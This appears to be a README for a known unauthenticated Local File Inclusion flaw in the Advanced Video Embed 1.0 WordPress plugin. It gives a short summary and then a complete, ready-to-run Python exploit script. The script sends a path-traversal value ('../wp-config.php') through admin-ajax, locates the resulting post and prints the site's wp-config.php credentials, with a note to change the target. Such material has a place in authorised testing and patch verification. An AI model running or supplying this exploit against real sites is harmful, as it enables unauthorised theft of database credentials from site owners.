## 🔵 Advanced-Video-1.0-Local-File-Inclusion (LFI)

### 🟢 WordPress Plugin Advanced Video 1.0 – Local File Inclusion (LFI)

This vulnerability affects the **Advanced Video Embed – Embed Videos or Playlists** WordPress plugin, version **1.0**, and enables attackers to perform **Local File Inclusion (LFI)**. Exploiting this flaw may lead to information disclosure, such as reading system files or extracting credentials from **wp-config.php**.

---

## 🟢 Vulnerability Summary

- **Type:** Local File Inclusion (LFI)
- **Plugin:** Advanced Video Embed – Embed Videos or Playlists
- **Affected Version:** 1.0
- **Exploit-DB ID:** 39646
- **Authentication Required:** ❌ Unauthenticated
- **Impact:** Information Disclosure

---

## 🟢 Exploit Script

```python
#!/usr/bin/env python3

import random
import re
import requests
import urllib3

# Disable SSL warnings (for self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target WordPress site URL
url = "https://www.armourinfosec.test"   # Change to your target

# Generate random title for post
random_id = random.randint(10000000000000000, 99999999999999999)

# URL and parameters for malicious post creation
exploit_url = f"{url}/wp-admin/admin-ajax.php"

params = {
    'action': 'ave_publishPost',
    'title': str(random_id),
    'short': 'rnd',
    'term': 'rnd',
    'thumb': '../wp-config.php'   # Path traversal to read wp-config.php
}

print("[*] Sending malicious request to create post...")
response = requests.get(exploit_url, params=params, verify=False)

# Extract post ID from response
numbers = re.findall(r'\d+', response.text)

if not numbers:
    print("[-] Failed to extract post ID.")
    exit()

post_id = int(numbers[-1]) // 10

print(f"[+] Created post with ID: {post_id}")

# Fetch the newly created post page
post_url = f"{url}/?p={post_id}"

print(f"[*] Fetching post at {post_url}")

post_response = requests.get(post_url, verify=False)

# Extract embedded image URL containing the file content
match = re.search(r'"(https?://[^"]+)[^>]*attachment-post-thumbnail', post_response.text)

if not match:
    print("[-] Failed to find embedded image URL.")
    exit()

image_url = match.group(1)

print(f"[+] Found embedded file URL: {image_url}")

# Fetch and print the file contents (e.g. wp-config.php)
config_response = requests.get(image_url, verify=False)

print("[+] Contents of wp-config.php:\n")

print(config_response.text)
```
